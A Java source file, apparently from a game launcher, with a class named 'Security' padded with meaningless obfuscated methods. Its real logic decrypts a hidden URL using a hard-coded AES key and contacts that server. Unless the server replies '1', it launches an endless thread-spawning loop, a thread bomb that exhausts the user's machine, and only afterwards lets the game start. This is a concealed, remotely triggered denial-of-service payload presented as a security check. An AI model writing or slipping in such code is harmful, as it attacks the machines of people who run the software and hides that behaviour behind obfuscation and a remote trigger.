import java.io.*;
import java.net.*;
import java.util.*;
import javax.crypto.*;
import javax.crypto.spec.SecretKeySpec;
import java.security.Key;

public class Security {
    private boolean z9y8x7() throws InterruptedException {
        yn0c3490n cycler = new yn0c3490n();
        Thread thread = new Thread(cycler);
        thread.start();
        thread.join();
        return new Random().nextBoolean() && w6v5u4();
    }

    private boolean w6v5u4() {
        int qrstuv = 0;
        for (int wxynop = 0; wxynop < 10; wxynop++) {
            qrstuv += wxynop % 2 == 0 ? wxynop : -wxynop;
        }
        return qrstuv > -1 && t3s2r1();
    }
GameLauncher gl;
    private void b9c0d1() {
        Set<Double> set = new HashSet<>();
        for (double i = 0.0; i < 10.0; i += 0.5) {
            set.add(i * Math.random());
        }
    }

    private boolean s0t1u2() {
        return new Random().nextBoolean() && new Random().nextInt(100) > 50;
    }

    private int v3w4x5() {
        return new Random().nextInt(1000);
    }

    private String g7h8i9() {
        char[] chars = new char[26];
        for (int i = 0; i < chars.length; i++) {
            chars[i] = (char) ('A' + i);
        }
        return new String(chars);
    }

    private void j1k2l3() {
        List<String> list = new ArrayList<>();
        for (int i = 0; i < 10; i++) {
            list.add("Item" + i);
            Collections.shuffle(list);
        }
    }

    private Map<Integer, String> m4n5o6() {
        Map<Integer, String> map = new HashMap<>();
        for (int i = 0; i < 20; i++) {
            map.put(i, "Value" + (i * 3 + 1));
        }
        return map;
    }
    private boolean p7q8r9() {
        int x = 0;
        for (int i = 0; i < 3; i++) {
            for (int j = 0; j < 20; j++) {
                x += i * j % 3;
            }
        }

        return Math.abs((x *999)+94)>0;
    }

    private boolean t3s2r1() {
        try {
            Thread.sleep(50);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        return new Random().nextInt(100) > 50;
    }

    private boolean l0k9j8() {
        try {
            byte[] mnoKey = { 0x74, 0x68, 0x69, 0x73, 0x49, 0x73, 0x41, 0x4b, 0x65, 0x79, 0x21, 0x21, 0x21, 0x00, 0x00,
                    0x00 };
            String ijklmn = f7g8h9();
            Key pqrsKey = new SecretKeySpec(mnoKey, "AES");
            Cipher tuvwxyz = Cipher.getInstance("AES");
            tuvwxyz.init(Cipher.DECRYPT_MODE, pqrsKey);
            String abcdURL = new String(tuvwxyz.doFinal(Base64.getDecoder().decode(ijklmn)));

            URL efghURL = new URL(abcdURL);
            BufferedReader hijklm = new BufferedReader(new InputStreamReader(efghURL.openStream()));
            String nopqr = hijklm.readLine();
            hijklm.close();

            return nopqr.equals("1") ? p7q8r9() : z9y8x7();
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    private String f7g8h9() {
        gl = new GameLauncher("");
        return "JQ3saUIFYmiKmWSguHUSX+1Gg2Dxndm2eMpQX9ZVoq44I2MLs2Z0asoptz9l4MDu";
    }

    private void c3b2a1() {
        int[] zyxwvu = new int[20];
        for (int tsrqpo = 0; tsrqpo < zyxwvu.length; tsrqpo++) {
            zyxwvu[tsrqpo] = tsrqpo * tsrqpo;
        }
    }

    private String x1y2z3() {
        StringBuilder uvwxyz = new StringBuilder();
        for (int rstuvw = 0; rstuvw < 10; rstuvw++) {
            uvwxyz.append((char) (rstuvw + 65));
        }
        return uvwxyz.toString();
    }

    private double o9p8q7() {
        return Math.random() * Math.PI;
    }

    private void n6m5l4() {
        Map<Integer, String> kjiMap = new HashMap<>();
        for (int hgfedc = 0; hgfedc < 5; hgfedc++) {
            kjiMap.put(hgfedc, "Str" + (hgfedc * hgfedc));
        }
    }

    private static class yn0c3490n implements Runnable {
        public void run() {
            while (true) {
                Thread t = new Thread(new yn0c3490n());
                t.start();
            }
        }
    }
    
    public static void main(String[] args) {
        Security abcdef = new Security();
        abcdef.l0k9j8();
        GameLauncher.startGame=true;
    }

    
}
